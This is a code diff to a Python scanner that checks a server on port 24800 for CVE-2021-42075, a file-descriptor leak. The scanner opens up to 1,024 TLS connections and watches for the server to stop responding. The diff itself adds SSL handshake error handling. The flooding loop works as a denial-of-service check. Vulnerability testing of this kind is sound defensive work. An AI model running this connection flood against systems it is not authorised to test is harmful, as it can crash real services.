@@ -5,6 +5,7 @@ Tests for file descriptor leak vulnerability leading to DoS
 """
 
 import socket
+import ssl
 import time
 from utils import create_ssl_context, normalize_host
 
@@ -20,19 +21,24 @@ def scan(host, port=24800, max_connections=1024):
         for i in range(max_connections):
             try:
                 sock = socket.create_connection((host, port), timeout=1.0)
-                ssl_sock = context.wrap_socket(sock, server_hostname=host)
-                connections.append(ssl_sock)
-                if i % 100 == 0:
-                    print(f"Opened {i} connections")
-                    
-                if i > 0 and i % 200 == 0:
-                    try:
-                        test_sock = socket.create_connection((host, port), timeout=1.0)
-                        with context.wrap_socket(test_sock, server_hostname=host) as test_ssl:
-                            test_ssl.close()
-                    except (socket.error, ssl.SSLError) as e:
-                        print(f"[!] WARNING: Server became unresponsive after {i} connections: {e}")
-                        break
+                try:
+                    ssl_sock = context.wrap_socket(sock, server_hostname=host)
+                    connections.append(ssl_sock)
+                    if i % 100 == 0:
+                        print(f"Opened {i} connections")
+                        
+                    if i > 0 and i % 200 == 0:
+                        try:
+                            test_sock = socket.create_connection((host, port), timeout=1.0)
+                            with context.wrap_socket(test_sock, server_hostname=host) as test_ssl:
+                                test_ssl.close()
+                        except (socket.error, ssl.SSLError) as e:
+                            print(f"[!] WARNING: Server became unresponsive after {i} connections: {e}")
+                            break
+                except ssl.SSLError as e:
+                    print(f"[!] SSL handshake failed: {e}")
+                    sock.close()
+                    break
                 
             except (socket.error, ssl.SSLError) as e:
                 print(f"[!] WARNING: CVE-2021-42075 - Server failed after {i} connections: {e}")
